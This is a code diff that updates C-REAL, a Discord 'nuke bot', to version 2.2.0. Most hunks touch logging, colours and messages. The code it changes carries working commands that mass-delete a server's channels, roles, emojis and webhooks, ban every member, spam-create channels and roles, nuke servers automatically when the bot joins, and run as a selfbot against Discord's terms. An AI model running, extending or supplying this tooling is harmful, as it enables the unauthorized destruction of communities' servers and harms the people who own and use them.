@@ -26,11 +26,11 @@ Don't use the bot on real servers or use it to spam because this is breaking
 discord's ToS, and you will be resulted in an account deletion.
 """
 # discord
-import discord, sys, requests, os
+import discord, sys, requests, os, time
 from discord.ext import commands
 import asyncio
 from packaging import version
-from random import randint, choice, randrange
+from random import randint, choice, randrange, random
 from threading import Thread
 from queue import Queue
 from json import load, dumps, decoder
@@ -38,15 +38,15 @@ from io import BytesIO
 from math import ceil
 # style
 try:
-    import colorama
+    from colorama import init, Fore
     if sys.platform == 'win32':
-            colorama.init()
+            init(autoreset=True)
 except ImportError: 
     pass 
 
 # 
 __TITLE__ = "C-REAL"
-__VERSION__ = "2.1"
+__VERSION__ = "2.2.0"
 __AUTHOR__ = "TKperson"
 __LICENSE__ = "MIT"
 
@@ -55,11 +55,13 @@ per_page = 15
 commands_per_page = 5
 number_of_bomb_default = 250
 selected_server = None
+selected_server_member_bot = None
 sorted_commands = []
 webhook_targets = []
 saved_ctx = None
 nuke_on_join = False
 auto_nick = False
+auto_status = False
 
 ''' #### Not planning to use regex
 Super expensive regex if used to check long strings
@@ -115,7 +117,7 @@ def read_json():
 def banner():
     sys.stdout.buffer.write(f'''\
  ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
-██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: {__VERSION__}
+██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: {Fore.BLUE}{__VERSION__}{Fore.RESET}
 ██║         █████╗        ██████╔╝█████╗  ███████║██║     Made by:
 ██║         ╚════╝        ██╔══██╗██╔══╝  ██╔══██║██║       TKperson
 ╚██████╗                  ██║  ██║███████╗██║  ██║███████╗    and
@@ -144,6 +146,7 @@ try:
     print('Checking selfbot token.', end='\r')
     if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=headers).json():
         # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
+        # Reading source codes is always a good thing :)
         headers['authorization'] = 'Bot ' + token
         print('Checking normal bot token.', end='\r')
         if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=headers).json():
@@ -158,8 +161,8 @@ print('Loading scripts...' + ' ' * 15, end='\r')
 
 """
 command_prefix   - command prefix
-case_insensitive - readable ascii doesn't have to be all caps or all lowers
-self_bot         - bot won't be able to see the message it sent to itself if this is set to false
+case_insensitive - commands will be callable without case retrictions if this is set to true
+self_bot         - If this is set to true then the bot will be able to see all message coming from itself and ignore other messages
 intents          - permissions on the server side for reading the full members/heavy list.
 """
 client = commands.Bot(command_prefix=command_prefix, case_insensitive=True, self_bot=is_selfbot, intents=discord.Intents().all())
@@ -184,20 +187,22 @@ async def on_connect():
 async def on_ready():
     banner()
     print('/+========================================================')
-    print('| | Bot ready.')
-    print('| + Logged in as')
+    print(f'| | {Fore.GREEN}Bot ready.')
+    print(f'| {Fore.MAGENTA}+ Logged in as')
     print(f'| | {client.user.name}#{client.user.discriminator}')
     print(f'| | {client.user.id}')
-    print('| + Permission given to ')
+    print(f'| {Fore.MAGENTA}+ Permission given to ')
     for permission in permissions:
         print(f'| | {permission}')
-    print('| + Bot prefix: ' + command_prefix)
+    print(f'| {Fore.MAGENTA}+ Bot prefix: ' + command_prefix)
     if is_selfbot:
-        print('| + [Selfbot] This is a selfbot. Join servers with join codes.')
+        print(f'| {Fore.YELLOW}+ [Selfbot] This is a selfbot. Join servers with join codes.')
     else:
-        print(f'| + https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot')
+        print(f'| {Fore.YELLOW}+ https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot')
     print('| ~*************************************')
     print('\\+-----')
+
+    # DEBUG REQUESTS MODE
 
     # global selected_server
     # selected_server = client.guilds[1]
@@ -218,6 +223,8 @@ async def on_ready():
     # requests_log.setLevel(logging.DEBUG)
     # requests_log.propagate = True
 
+    # idk why i chose this link...
+
     # # requests.get('https://httpbin.org/headers')
     # await selected_server.create_text_channel('lol')
 
@@ -234,15 +241,27 @@ async def log(ctx, message):
     - coming soon
     """
     if want_log_message:
-        try:
-            await ctx.send(message)
-        except discord.errors.HTTPException:
-            for i in range(ceil(len(message) / 2000)):
-                await log(ctx, message[2000 * i:2000 * (i + 1)])
+        if not isDM(ctx) and ctx.guild.id == selected_server.id and 1 << 11 & selected_server_member_bot.guild_permissions.value == 0:
+            consoleLog(message, True)
+        else:
+            try:
+                await ctx.send(message)
+            except discord.errors.HTTPException:
+                for i in range(ceil(len(message) / 2000)):
+                    await log(ctx, message[2000 * i:2000 * (i + 1)])
+            except:
+                consoleLog(message)
 
-def consoleLog(message):
+def consoleLog(message, print_time=False):
+    TIME = ''
     if want_log_console:
-        print(message)
+        if print_time:
+            TIME = f'{Fore.MAGENTA}[{time.strftime("%H:%M:%S", time.localtime())}] {Fore.RESET}'
+
+        try:
+            print(f'{TIME}{message}')
+        except TypeError: # when there's a character that can't be logged with python print function.
+            sys.stdout.buffer.write(f'{TIME}{message}'.encode('utf8'))
 
 @client.event
 async def on_command_error(ctx, error):
@@ -294,13 +313,12 @@ async def on_command_error(ctx, error):
     elif isinstance(error, commands.CommandInvokeError):
         await log(ctx, 'Command invoke error')
     
-    elif isinstance(error, discord.errors.HTTPException):
+    elif isinstance(error, discord.errors.HTTPException): # usually caused by sending over 2000 characters limit
         # has already been handled in "def log"
         pass
 
     elif isinstance(error, commands.UserInputError):
         await log(ctx, 'Invalid input.')
-        # await self.send_command_help(ctx)
 
     elif isinstance(error, commands.MissingRequiredArgument):
         if error.param.name == 'inp':
@@ -315,12 +333,13 @@ async def on_command_error(ctx, error):
         # print(error)
         # print(error.args)
         # print(type(error.args))
-        try:
+
+        try: # Don't want too many things logged into discord
             await log(ctx, '%s' % error.args)
         except discord.errors.NotFound: # When ctx.channel is deleted 
             pass
-        except TypeError:
-            sys.stdout.buffer.write(error.args.encode('utf8'))
+        except: # When there's a charater that can't be logged into discord. Like if error.args contains a tuple which can't be automatically turned into a string.
+            consoleLog(f'{Fore.RED}Error -> {error.args}: {Fore.YELLOW}When to using "{ctx.message.content}".', True)
 
 if is_selfbot:
     @client.event
@@ -381,29 +400,44 @@ async def embed(ctx, n, title, array):
 
     for i in range(init_item, final_item, 1):
         item = array[i]
-        names += f'{item.name} \n'
-        ids += f'{str(item.id)} \n'
+        if len(item.name) > 17:
+            item.name = item.name[:17] + '...'
+        names += f'{item.name}\n'
+        ids += f'{str(item.id)}\n '
 
-    theColor = randint(0, 0xFFFFFF)
-    embed = discord.Embed(
-        title = title,
-        description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
-        color = theColor
-    )
-    embed.add_field(name='Name', value=names, inline=True)
-    embed.add_field(name='ID', value=ids, inline=True)
-    embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}')
-    await ctx.send(embed=embed)
+    if not isDM(ctx) and 1 << 11 & selected_server_member_bot.guild_permissions.value == 0 and (selected_server is None or ctx.guild.id == selected_server.id):
+        names = names.split('\n')
+        ids = ids.split(' ')
+        consoleLog(f'\n{Fore.GREEN}*{title}*\n{Fore.RESET}Total count: {Fore.YELLOW}{str(item_length)}\n{Fore.GREEN}__Name__{" " * 13}{Fore.CYAN}__ID__\n{ "".join([(Fore.GREEN + names[i].ljust(21) + Fore.CYAN + ids[i]) for i in range(len(names) - 1)]) }{Fore.YELLOW}{n+1}/{str(ceil(item_length / per_page))}', True)
+    else:
+        try:
+            theColor = randint(0, 0xFFFFFF)
+            embed = discord.Embed(
+                title = title,
+                description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
+                color = theColor
+            )
+            embed.add_field(name='Name', value=names, inline=True)
+            embed.add_field(name='ID', value=ids, inline=True)
+            embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}')
+            await ctx.send(embed=embed)
+        except:
+            names = names.split('\n')
+            ids = ids.split(' ')
+            await ctx.send(f'```*{title}*\nTotal count: {str(item_length)}\n__Name__{" " * 13}__ID__\n{ "".join([(names[i].ljust(21) + ids[i]) for i in range(len(names) - 1)]) }{n+1}/{str(ceil(item_length / per_page))}```')
 
 async def hasTarget(ctx):
     """
     Checking if there's a selected server for using the comands.
     """
-    global selected_server
+    # if not 1 << 11 & value:
+    #     consoleLog('No permission to send message')
+    #     return
+
     if selected_server is not None:
         return True
     elif not isDM(ctx):
-        selected_server = ctx.guild
+        await connect(ctx)
         await log(ctx, f'You have been automatically `{command_prefix}connect` to server `{selected_server.name}` because you are not connected to a server and using a command inside a server.')
         return True
     else:
@@ -421,9 +455,9 @@ def checkPerm(ctx):
         if str(ctx.author.id) == user or f'{ctx.author.name}#{ctx.author.discriminator}' == user:
             return True
     if not isDM(ctx):
-        consoleLog(f'{ctx.author.name}#{ctx.author.discriminator} tried to use "{ctx.message.content}" in server "{ctx.guild.name}", at channel "{ctx.channel.name}".')
+        consoleLog(f'{ctx.author.name}#{ctx.author.discriminator} tried to use "{ctx.message.content}" in server "{ctx.guild.name}", at channel "{ctx.channel.name}".', True)
     else:
-        consoleLog(f'{ctx.author.name}#{ctx.author.discriminator} tried to use "{ctx.message.content}" in the bot\'s direct message.')
+        consoleLog(f'{ctx.author.name}#{ctx.author.discriminator} tried to use "{ctx.message.content}" in the bot\'s direct message.', True)
     return False
 
 def fixedChoice():
@@ -474,6 +508,10 @@ async def help(ctx, asked_command=None):
 @commands.check(checkPerm)
 @client.command(name='servers', aliases=['se', 'server'])
 async def servers(ctx, n='1'):
+    if not isDM(ctx):
+        global selected_server_member_bot
+        selected_server_member_bot = containing(ctx.guild.members, str(client.user.id))
+    
     await embed(ctx, n, 'Servers', client.guilds)
 
 @commands.check(checkPerm)
@@ -528,13 +566,18 @@ async def bans(ctx, n='1'):
 @commands.check(checkPerm)
 @client.command(name='connect', aliases=['con'])
 async def connect(ctx, *, server=None):
-    temp_name = server
-    server = containing(client.guilds, server)
-    if server is None:
-        await log(ctx, f'Unable to find {temp_name} server.')
-        return
-    global selected_server
+    if server is None and not isDM(ctx):
+        server = ctx.guild
+    else:
+        temp_name = server
+        server = containing(client.guilds, server)
+        if server is None:
+            await log(ctx, f'Unable to find {temp_name} server.')
+            return
+
+    global selected_server, selected_server_member_bot
     selected_server = server
+    selected_server_member_bot = containing(selected_server.members, str(client.user.id))
     await log(ctx, f'Successfully connected to {server.name}.')
 
 #########  Unities  ##########
@@ -548,16 +591,16 @@ async def addChannel(ctx, channel_name, *, category=None):
         temp = category
         category = containing(selected_server.categories, category)
         if category is None:
-            consoleLog(f'Unable to find category: {temp}')
+            await log(ctx, f'Unable to find category: {temp}')
             return
 
     try:
         await selected_server.create_text_channel(channel_name, category=category)
         if category is None:
             category = 'No category.'
-        consoleLog(f'Successfully added channel: {channel_name}')
+        await log(ctx, f'Successfully added channel: {channel_name}')
     except:
-        consoleLog(f'Unable to add channel: {channel_name}')
+        await log(ctx, f'Unable to add channel: {channel_name}')
         raise
 
 @commands.check(checkPerm)
@@ -593,10 +636,10 @@ async def addEmoji(ctx, item, *, name=None, bits=None):
         if item.startswith(('https://', 'http://', 'ftp://', 'ftps://')): # Link EX: https://www.example.com/aaa.png
             try:
                 if name is None:
-                    await log(ctx, 'Name for emoji? I\'m not gonna always name it for you...')
+                    await log(ctx, 'Name for emoji? I\'m not always going to name it for you...')
                     return 
                 await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(item).content).read())
-                await log(ctx, 'Successfully changed the current server icon.')
+                await log(ctx, f'Successfully added emoji `{name}`.')
             except:
                 raise
 
@@ -630,9 +673,9 @@ async def addCategory(ctx, *, category_name):
     
     try:
         await selected_server.create_category(category_name)
-        consoleLog(f'Successfully created category: {category_name}')
+        await log(ctx, f'Successfully created category `{category_name}`.')
     except:
-        consoleLog(f'Unable to create category: {category_name}')
+        await log(ctx, f'Unable to create category `{category_name}`.')
         raise
     
 @commands.check(checkPerm)
@@ -644,9 +687,9 @@ async def addRole(ctx, *, name):
         name = name.split()
         perms = name.pop(-1)
         await selected_server.create_role(name=' '.join(name), permissions=discord.Permissions(permissions=int(perms)))
-        await log(ctx, f'Successfully added `{name}` with permission `{perms}`.')
+        await log(ctx, f'Successfully added role `{name}` with permission `{perms}`.')
     except:
-        await log(ctx, f'Failed to add `{name}`.')
+        await log(ctx, f'Failed to add role `{name}`.')
         raise
 
 @commands.check(checkPerm)
@@ -668,7 +711,7 @@ async def moveRole(ctx, *, name):
         await role.edit(position=int(position))
         await log(ctx, 'Role moved.`')
     except:
-        await log(ctx, f'Unable to move `{name}` to position `{position}`.')
+        await log(ctx, f'Unable to move role `{name}` to position `{position}`.')
         raise
 
 @commands.check(checkPerm)
@@ -683,9 +726,9 @@ async def deleteRole(ctx, *, name):
 
     try:
         await role.delete()
-        consoleLog(f'Successfully removed {role.name}')
+        await log(ctx, f'Successfully removed role `{role.name}`')
     except:
-        await log(ctx, f'Unable to delete `{role.name}`.')
+        await log(ctx, f'Unable to delete role `{role.name}`.')
         raise
 
 @commands.check(checkPerm)
@@ -701,9 +744,9 @@ async def deleteChannel(ctx, channel_name):
 
     try:
         await channel.delete(reason=None)
-        consoleLog(f'Channel: {channel.name} is deleted.')
+        await log(ctx, f'Channel `{channel.name}` is deleted.')
     except:
-        consoleLog(f'Unable to delete channel: {channel.name}')
+        await log(ctx, f'Unable to delete channel `{channel.name}`.')
         raise
 
 @commands.check(checkPerm)
@@ -715,13 +758,13 @@ async def deleteVoiceChannel(ctx, VC_name):
     channel = containing(selected_server.voice_channels, VC_name)
 
     if channel is None:
-        await log(f'Unable to find voice channel "`{VC_name}`".')
+        await log(f'Unable to find voice channel `{VC_name}`.')
 
     try:
         await channel.delete(reason=None)
-        consoleLog(f'Voice channel "{channel.name}" is deleted.')
+        await log(ctx, f'Voice channel `{channel.name}` is deleted.')
     except:
-        consoleLog(f'Unable to delete voice channel "{channel.name}".')
+        consoleLog(f'Unable to delete voice channel `{channel.name}`.')
         raise
 
 @commands.check(checkPerm)
@@ -733,13 +776,13 @@ async def deleteCategory(ctx, *, category_name):
     channel = containing(selected_server.categories, category_name)
 
     if channel is None:
-        await log(f'Unable to find category "`{category_name}`".')
+        await log(ctx, f'Unable to find category `{category_name}`.')
 
     try:
         await channel.delete(reason=None)
-        consoleLog(f'Category "{channel.name}" is deleted.')
+        await log(ctx, f'Category "{channel.name}" is deleted.')
     except:
-        consoleLog(f'Unable to delete category "{channel.name}".')
+        await log(ctx, f'Unable to delete category "{channel.name}".')
         raise
 
 @commands.check(checkPerm)
@@ -756,9 +799,9 @@ async def deleteCC(ctx, *, name):
 
     try:
         await channel.delete(reason=None)
-        consoleLog(f'Channel "{channel.name}" is removed from the server.')
+        await log(ctx, f'Channel "{channel.name}" is removed from the server.')
     except:
-        consoleLog(f'Unable to delete channel "{channel.name}".')
+        await log(ctx, f'Unable to delete channel "{channel.name}".')
         raise
 
 @commands.check(checkPerm)
@@ -771,9 +814,9 @@ async def deleteEmoji(ctx, *, name):
 
     try:
         await emoji.delete(reason=None)
-        consoleLog(f'Emoji `{emoji.name}` is removed from the server.')
+        await (ctx, f'Emoji `{emoji.name}` is removed from the server.')
     except:
-        consoleLog(f'Unable to delete emoji: `{emoji.name}`.')
+        await log(ctx, f'Unable to delete emoji: `{emoji.name}`.')
         raise
 
 @commands.check(checkPerm)
@@ -783,9 +826,9 @@ async def ban(ctx, member:discord.Member):
         return
     try:
         await member.ban()
-        consoleLog(f'Successfully banned `{member.name}#{member.discriminator}`.')
+        await log(ctx, f'Successfully banned `{member.name}#{member.discriminator}`.')
     except:
-        consoleLog(f'Unable to ban `{member.name}#{member.discriminator}`.')
+        await log(ctx, f'Unable to ban `{member.name}#{member.discriminator}`.')
         raise
 
 @commands.check(checkPerm)
@@ -800,9 +843,9 @@ async def unban(ctx, *, name):
         return
     try:
         await selected_server.unban(member)
-        await log(ctx, f'{name} is now free :).')
+        await log(ctx, f'`{member.name}#{member.discriminator}` is now free :).')
     except:
-        consoleLog(f'Failed to unban {name}.')
+        await log(ctx, f'Failed to unban `{member.name}#{member.discriminator}`.')
         raise
     
 @commands.check(checkPerm)
@@ -844,10 +887,10 @@ async def kaboom(ctx, n, method):
         return 
     
     if not n.isdigit() or int(n) < 0:
-        await log(ctx, 'Please insert an integer that is greater than 0.')
+        await log(ctx, 'Please enter a positive integer.')
         return
 
-    await log(ctx, f'A series of bombs have been released into `{selected_server}`.')
+    await log(ctx, f'A series of bombs have been dropped onto `{selected_server.name}`.')
     tasks = [channelBomb(ctx, n, method), categoryBomb(ctx, n, method), roleBomb(ctx, n, method)]
     await asyncio.gather(*tasks)
     
@@ -1112,18 +1155,27 @@ async def nuke(ctx):
     if not await hasTarget(ctx):
         return
 
-    await log(ctx, f'A nuke has been deployed on `{selected_server.name}`.')
+    await log(ctx, f'A nuke has been launched to `{selected_server.name}`.')
     tasks = [deleteAllChannels(ctx), deleteAllEmojis(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx)]
     await asyncio.gather(*tasks)
 
     if len(after) > 0:
-        consoleLog('Running after commands...')
-        for command in after:
-            # Lol im so smart to think some like this would work
-            ctx.message.content = command_prefix + command
-            await client.process_commands(ctx.message)
+        if selected_server.id == ctx.guild.id: ## this will still cause an id not found error: fix this later
+            ctx.message.channel = None 
 
-        consoleLog('After commands completed.')
+        consoleLog(f'{Fore.BLUE}Running after commands...', True)
+        for command in after:
+            # Lol im so smart to think something like this would work
+            try:
+                ctx.message.content = command_prefix + command
+                await client.process_commands(ctx.message)
+                # if not server_changes and command.lower().startswith(('si', 'sn', 'servericon', 'changeservericon', 'servername', 'changeservername')):
+                #     pass
+            except:
+                consoleLog(f'{Fore.RED}Command {Fore.YELLOW}"{command_prefix}{command}" {Fore.RED}has failed to execute.', True)
+                pass
+
+        consoleLog(f'{Fore.GREEN}After commands completed.')
 
 @commands.check(checkPerm)
 @client.command(name='deleteAllRoles', aliases=['dar', 'dAllRoles'])
@@ -1131,12 +1183,12 @@ async def deleteAllRoles(ctx):
     if not await hasTarget(ctx):
         return
 
-    consoleLog('Starting to delete all roles...')
+    consoleLog(f'{Fore.YELLOW}Starting to delete all roles...', True)
     for role in selected_server.roles:
         q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles/{role.id}', headers, None))
         
     q.join()
-    consoleLog('Finished deleting roles.')
+    consoleLog(f'{Fore.GREEN}Finished deleting roles.', True)
 
 @commands.check(checkPerm)
 @client.command(name='deleteAllChannels', aliases=['dac', 'dAllChannels'])
@@ -1144,12 +1196,12 @@ async def deleteAllChannels(ctx):
     if not await hasTarget(ctx):
         return
 
-    consoleLog('Starting to delete all types of channels...')
+    consoleLog(f'{Fore.YELLOW}Starting to delete all types of channels...', True)
     for channel in selected_server.channels:
         q.put((requests.delete, f'https://discord.com/api/v8/channels/{channel.id}', headers, None))
         
     q.join()
-    consoleLog('Finished deleting channels.')
+    consoleLog(f'{Fore.GREEN}Finished deleting channels.', True)
 
 @commands.check(checkPerm)
 @client.command(name='deleteAllEmojis', aliases=['dae', 'dAllEmoji'])
@@ -1157,12 +1209,12 @@ async def deleteAllEmojis(ctx):
     if not await hasTarget(ctx):
         return
 
-    consoleLog('Starting to delete all emojis...')
+    consoleLog(f'{Fore.YELLOW}Starting to delete all emojis...', True)
     for emote in selected_server.emojis:
         q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/emojis/{emote.id}', headers, None))
         
     q.join()
-    consoleLog('Finished deleting emojis.')
+    consoleLog(f'{Fore.GREEN}Finished deleting emojis.', True)
 
 @commands.check(checkPerm)
 @client.command(name='deleteAllWebhooks', aliases=['daw', 'dAllWebhooks'])
@@ -1170,12 +1222,12 @@ async def deleteAllWebhooks(ctx):
     if not await hasTarget(ctx):
         return
 
-    consoleLog('Starting to delete all webhooks...')
+    consoleLog(f'{Fore.YELLOW}Starting to delete all webhooks...', True)
     for webhook in await selected_server.webhooks():
         q.put((requests.delete, f'https://discord.com/api/v8/webhooks/{webhook.id}', headers, None))
         
     q.join()
-    consoleLog('Finished deleting webhooks.')
+    consoleLog(f'{Fore.GREEN}Finished deleting webhooks.', True)
 
 @commands.check(checkPerm)
 @client.command(name='banAll')
@@ -1184,12 +1236,12 @@ async def banAll(ctx):
         return
 
     payload = {'delete_message_days':'0', 'reason': ''}
-    consoleLog('Starting ban all...')
+    consoleLog(f'{Fore.YELLOW}Starting ban all...', True)
     for member in selected_server.members:
         q.put((requests.put, f'https://discord.com/api/v8/guilds/{selected_server.id}/bans/{member.id}', headers, payload))
         
     q.join()
-    consoleLog('Ban all completed')
+    consoleLog(f'{Fore.GREEN}Ban all completed.', True)
 
 ## Additional functions ##
 @commands.check(checkPerm)
@@ -1204,9 +1256,9 @@ async def checkRolePermissions(ctx, name, n='1'):
     if member is None:
         await log(ctx, f'Unable to found {name}.')
         return
+    value = member.guild_permissions.value
 
     temp = sorted(member.guild_permissions, key=lambda p: p)
-    value = member.guild_permissions.value
     master_list = ''
 
     item_length = 31
@@ -1227,24 +1279,28 @@ async def checkRolePermissions(ctx, name, n='1'):
             master_list += ':x: '
         master_list += item.replace('_', ' ').capitalize() + '\n'
     
-    try:
-        embed = discord.Embed(
-            title = 'User permissions',
-            description = f'Encoded value: {str(value)} : 2147483647',
-            color = discord.Color.red()
-        )
+    if not isDM(ctx) and ctx.guild.id == selected_server.id and 1 << 11 & selected_server_member_bot.guild_permissions.value == 0:
+        consoleLog('\n%s*Check role permissions*\n%sPermission value -> %s%d : 2147483647\n%s %s%d/%d' % (Fore.CYAN, Fore.RESET, Fore.YELLOW, value, master_list.replace(':white_check_mark:', f'{Fore.GREEN}+').replace(':x:', f'{Fore.RED}-'), Fore.YELLOW, n+1, ceil(item_length / per_page)), True)
+    else:
+        try:
+            embed = discord.Embed(
+                title = 'User permissions',
+                description = f'Encoded value: {str(value)} : 2147483647',
+                color = discord.Color.red()
+            )
 
-        embed.add_field(name='Permissions', value=master_list, inline=True)
-        embed.set_footer(text=f'{str(n+1)}/{str(ceil(item_length / per_page))}')
-        await ctx.channel.send(embed=embed)
-    except:
-        await ctx.channel.send('```diff\n%s %d/%d```' % (master_list.replace(':white_check_mark:', '+').replace(':x:', '-'), n+1, ceil(item_length / per_page)))
+            embed.add_field(name='Permissions', value=master_list, inline=True)
+            embed.set_footer(text=f'{str(n+1)}/{str(ceil(item_length / per_page))}')
+            await ctx.send(embed=embed)
+        except:
+            await ctx.send('```diff\n%s %d/%d```' % (master_list.replace(':white_check_mark:', '+').replace(':x:', '-'), n+1, ceil(item_length / per_page)))
 
 @commands.check(checkPerm)
 @client.command(name='si', aliases=['serverIcon', 'changeServerIcon'])
 async def si(ctx, path=None):
     if not await hasTarget(ctx):
         return
+
     if path is None:
         await selected_server.edit(icon=None)
         await log(ctx, f'Successfully removed the server icon from `{selected_server.name}`.')
@@ -1253,7 +1309,8 @@ async def si(ctx, path=None):
             await selected_server.edit(icon=BytesIO(requests.get(path).content).read())
             consoleLog('Successfully changed the current server icon.')
         except:
-            raise
+            consoleLog(f'Unable to change the server icon to "{path}".')
+
     elif path[0] == '<': # EX: <a:triggeredd:627060014431076352>
         path = path.split(':')
         try:
@@ -1288,8 +1345,10 @@ async def sn(ctx, *, name):
     try:
         await selected_server.edit(name=name)
         await log(ctx, f'Server name has been changed to `{name}`.')
-    except Exception:
+    except discord.errors.Forbidden:
         await log(ctx, 'Unable to change server name.')
+        raise
+    except:
         raise
 
 @commands.check(checkPerm)
@@ -1300,7 +1359,7 @@ async def clear(ctx, n=None):
 
     consoleLog('Starting to delete all types of channels...')
     for channel in ctx.history(limit=n):
-        q.put(requests.delete, f'https://discord.com/api/v8/channels/{ctx.channel.id}/messages/788936893084729364', )
+        q.put((requests.delete, f'https://discord.com/api/v8/channels/{ctx.channel.id}/messages/788936893084729364', headers))
 
 @commands.check(checkPerm)
 @client.command(name='leave')
@@ -1316,7 +1375,10 @@ async def leave(ctx, name=None):
             return
         await server.leave()
 
-        await log(ctx, f'Left {name}.')
+    if not isDM(ctx) and ctx.guild.id == selected_server.id:
+        consoleLog(f'{Fore.BLUE}Goodbye {selected_server.name}! {Fore.YELLOW}-> {Fore.GREEN}Left {Fore.RESET}{selected_server.name}.', True)
+    else:
+        await log(ctx, f'Goodbye {selected_server.name}! -> Left {selected_server.name}.')
 
 @commands.check(checkPerm)
 @client.command(name='leaveAll')
@@ -1324,7 +1386,7 @@ async def leaveAll(ctx):
     await log(ctx, 'Leaving all servers. Note: You won\'t be able to message me after I left all servers.')
     for server in client.guilds:
         await server.leave() 
-    consoleLog('Left all servers.')
+    consoleLog('Left all servers.', True)
 
 @commands.check(checkPerm)
 @client.command(name='joinNuke', aliases=['nukeOnJoin', 'join nuke'])
@@ -1338,7 +1400,7 @@ async def joinNuke(ctx, true_or_false):
         nuke_on_join = False
         await log(ctx, 'Nuke on bot joining a new server has been turned off.')
     else:
-        await log(ctx, 'Invalid flag: true or false.')
+        await log(ctx, 'Invalid flag: true or false. Note: true or false is not case sensitive.')
 
 @commands.check(checkPerm)
 @client.command(name='changeStatus', aliases=['cs'])
@@ -1366,23 +1428,41 @@ async def autoNick(ctx):
         return
 
     # global headers
-    # print(headers)
-    member = containing(selected_server.members, str(client.user.id))
 
-    global auto_nick
+    global auto_nick, selected_server_member_bot
     if not auto_nick:
+        consoleLog(f'{Fore.CYAN}Auto nickname is on.', True)
         auto_nick = True
         while auto_nick:
-            # payload = {'nick': ''.join(choice(alphanum) for _ in range(10)}
+            # payload = {'nick': ''.join(choice(alphanum) for _ in range(10))}
             # q.put((requests.patch, f'https://discord.com/api/v8/guilds/{selected_server.id}/members/%40me/nick', headers, payload))
             
-            await member.edit(nick=''.join(choice(alphanum) for _ in range(10)))
+            await selected_server_member_bot.edit(nick=''.join(choice(alphanum) for _ in range(10)))
     else:
+        consoleLog(f'{Fore.BLUE}Auto nickname is off.', True)
         auto_nick = False
 
 @commands.check(checkPerm)
+@client.command(name='autoStatus', aliases=['as'])
+async def autoStatus(ctx):
+
+    global auto_status
+    if not auto_status:
+        consoleLog(f'{Fore.CYAN}Auto status is on.', True)
+        auto_status = True
+        while auto_status:
+            await client.change_presence(status=discord.Status.online)
+            await asyncio.sleep(random() + 0.3) # Theres a rate limit for changing status every minute or 5 minutes i havent figure out the exact number but ill stay with this sleep commmand
+            await client.change_presence(status=discord.Status.offline)
+            await asyncio.sleep(random() + 0.3)
+    else:
+        consoleLog(f'{Fore.BLUE}Auto status is off.', True)
+        auto_status = False
+
+
+@commands.check(checkPerm)
 @client.command(name='off', aliases=['logout', 'logoff', 'shutdown', 'stop'])
-async def off(ctx):
+async def off(ctx=None):
     ### Discord takes too long to realize if the bot is offline people might get confused about the not turning off the bot vs discord takes time to update
     await client.change_presence(status=discord.Status.offline)
     await client.logout()
@@ -1409,7 +1489,7 @@ try:
 #     print('Invalid token is being used.')
 #     exit()
 except discord.PrivilegedIntentsRequired:
-        print('PrivilegedIntentsRequired: Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application\'s page. If this is not possible, then consider disabling the privileged intents in the bot\'s source code instead. Go visit https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot to see how to properly add privileged intents.')
-        exit()
-finally:    
+    print('PrivilegedIntentsRequired: Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application\'s page. If this is not possible, then consider disabling the privileged intents in the bot\'s source code instead. Go visit https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot to see how to properly add privileged intents.')
+    exit()
+finally:
     print('Exiting...')
